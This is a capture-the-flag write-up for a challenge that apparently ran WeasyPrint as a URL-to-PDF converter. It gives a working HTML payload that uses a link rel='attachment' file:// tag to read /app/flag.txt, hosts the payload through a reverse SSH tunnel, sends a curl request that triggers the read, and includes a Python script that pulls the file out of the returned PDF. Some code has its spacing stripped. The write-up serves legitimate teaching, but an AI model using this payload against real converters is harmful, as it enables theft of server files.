<img width="577" height="517" alt="image" src="https://github.com/user-attachments/assets/4c7b3985-2112-406a-879f-c497c379beac" />

<img width="905" height="315" alt="image" src="https://github.com/user-attachments/assets/559c72b3-311e-49d4-bd7a-110ff4181c60" />

#### **Reconnaissance: Read the Source Code**

The challenge provides source files in the `printnightmare/` directory. The two critical files are `app.py` and `Dockerfile`.

#### **`Dockerfile` — Locating the Flag**

```
ARG FLAG=HNYX{fake_flag}
RUN echo "${FLAG}" > /app/flag.txt \
    && chown ctfuser:ctfuser /app/flag.txt \
    && chmod 400 /app/flag.txt
```

**Key finding:** The flag is stored at `/app/flag.txt` inside the container, readable only by `ctfuser`.

```
RUN useradd -m -u 1000 ctfuser
...
USER ctfuser
CMD ["gunicorn", ...]
```

The app runs **as** `ctfuser`, so it has permission to read `/app/flag.txt` (chmod 400 + owned by ctfuser).

#### **`app.py` — Identifying the Vulnerability**

```python
defis_valid_url(url:str)->bool:
"""Only allow http/https for the *top-level* URL the user submits.
    NOTE: this does NOT restrict what schemes WeasyPrint's own resource
    fetcher will follow for things referenced *inside* the fetched page
    (e.g. <link rel="attachment" href="file://...">). That's the bug.
    """
try:
        parsed= urlparse(url)
except ValueError:
returnFalse
return parsed.schemein("http","https")andbool(parsed.netloc)
```

The validator only checks that the user-submitted URL uses `http` or `https`. The comment **literally tells us the bug**: WeasyPrint's internal resource fetcher will follow `file://` links embedded *inside* the HTML page that gets fetched.

The route handler:

```python
@app.route("/", methods=["GET","POST"])
defindex():
if request.method=="POST":
        url=(request.form.get("url")or"").strip()
ifnot is_valid_url(url):
return render_template_string(HTML_TEMPLATE, error="Unsupported URL scheme")
try:
            doc= HTML(url=url)# <-- WeasyPrint fetches the URL
            pdf= doc.write_pdf()# <-- WeasyPrint renders to PDF, following sub-resources
except Exceptionas exc:
return render_template_string(HTML_TEMPLATE, error=f"Failed to fetch/convert URL:{exc}")
...
return send_file(bio,**send_kwargs)
```

**Summary of the attack surface:**

1. We supply a valid `https://...` URL → passes the validator.
2. That URL points to our own malicious HTML page.
3. Our HTML page contains `<link rel="attachment" href="file:///app/flag.txt">`.
4. WeasyPrint fetches our page, then follows the `file://` link and embeds `flag.txt` as a PDF attachment.
5. The server returns the PDF to us — with the flag inside.

---

#### **Craft the Malicious HTML Payload**

Create a file called `malicious.html`:

```html
<!DOCTYPEhtml>
<html>
<head>
<metacharset="UTF-8">
<title>Nothing to see here</title>
<!--
    WeasyPrint supports <link rel="attachment"> which causes it to fetch
    the href as a PDF embedded file attachment. The app only validates
    the top-level URL scheme, not what WeasyPrint loads internally.
  -->
<linkrel="attachment"href="file:///app/flag.txt">
</head>
<body>
<p>PrintNightmare exploit - reading /app/flag.txt via WeasyPrint SSRF</p>
</body>
</html>
```

The key is the `<link rel="attachment">` tag. WeasyPrint treats this as a PDF attachment directive (per the W3C "css-gcpm" specification) and will embed the target file into the PDF's EmbeddedFiles dictionary.

---

#### **Host the Malicious HTML Publicly**

The challenge server runs in the cloud and needs to reach our HTML file. We start a local HTTP server and expose it to the internet via **Serveo** (a free SSH-based reverse tunnel — no installation required).

#### **Start a local HTTP server**

```bash
python-m http.server8888--directory /path/to/exploit/
```

This serves `malicious.html` on `http://localhost:8888/malicious.html`.

#### **Create a public tunnel via Serveo**

```bash
ssh-oStrictHostKeyChecking=no-R80:localhost:8888 serveo.net
```

Serveo outputs a public URL such as:

`Forwarding HTTP traffic from https://b649a8ae34cd73c0-118-101-204-174.serveousercontent.com`

Our payload is now publicly reachable at:

```
https://b649a8ae34cd73c0-118-101-204-174.serveousercontent.com/malicious.html
```

> **Note:** The subdomain changes each tunnel session. Replace it with whatever Serveo assigns you.
> 

---

#### **Trigger the Exploit**

Send an HTTP POST request to the challenge endpoint with our public URL as the value for the `url` parameter. We save the response body (the PDF) to `output.pdf`.

```bash
curl.exe-s-X POST\
"http://a5ae9a00-6fdd-43e7-98dc-b50ab221298a.34.143.189.39.sslip.io:8001/"\
-d"url=https://b649a8ae34cd73c0-118-101-204-174.serveousercontent.com/malicious.html"\
-o output.pdf\
-w"HTTP_STATUS:%{http_code} SIZE:%{size_download}"
```

Expected output:

```
HTTP_STATUS:200 SIZE:4955
```

A ~5KB PDF is returned. The flag is embedded inside as a compressed stream.

---

#### **Extract the Flag from the PDF**

PDF files store their content in **streams** — binary blobs that are typically zlib-compressed (FlateDecode). We write a small Python script to decompress each stream and search for the flag pattern.

```python
import re, zlib
withopen("output.pdf","rb")as f:
    data= f.read()
# Find all stream/endstream pairs
pattern= re.compile(b'stream\r?\n(.*?)endstream', re.DOTALL)
matches= pattern.findall(data)
print(f"Found{len(matches)} streams")
for i, stream_datainenumerate(matches):
try:
        decompressed= zlib.decompress(stream_data)
        text= decompressed.decode("utf-8", errors="replace")
print(f"Stream{i} ({len(decompressed)} bytes):{repr(text[:120])}")
if"HNYX"in text:
print(f"\n*** FLAG:{text.strip()} ***\n")
except Exception:
print(f"Stream{i}: binary/uncompressed ({len(stream_data)} bytes)")
```

Run it:

```
bash

python extract_flag.py
```

Output:

```
Found 6 streams
Stream 0 (589 bytes): '1 0 0 -1 0 841.889764 cm\nq\n0.75 0 0 0.75 0 0 cm\n...'
Stream 1 (33 bytes): 'HNYX{d0nT_tRusT_uR1_c0nVerT3r!!}\n'
*** FLAG: HNYX{d0nT_tRusT_uR1_c0nVerT3r!!} ***
Stream 2: binary/uncompressed (2757 bytes)
Stream 3 (720 bytes): '/CIDInit /ProcSet findresource begin\n12 dict begin\nbegincmap...'
Stream 4 (1494 bytes): '1 0 2 38 3 100 4 263 ...<</Type /Filespec/F (flag.txt)/UF (flag.txt)...'
Stream 5: binary/uncompressed (68 bytes)
```

**Stream 1** contains the raw contents of `/app/flag.txt`.

---

#### **Flag**

```
HNYX{d0nT_tRusT_uR1_c0nVerT3r!!}
```

that the flag!
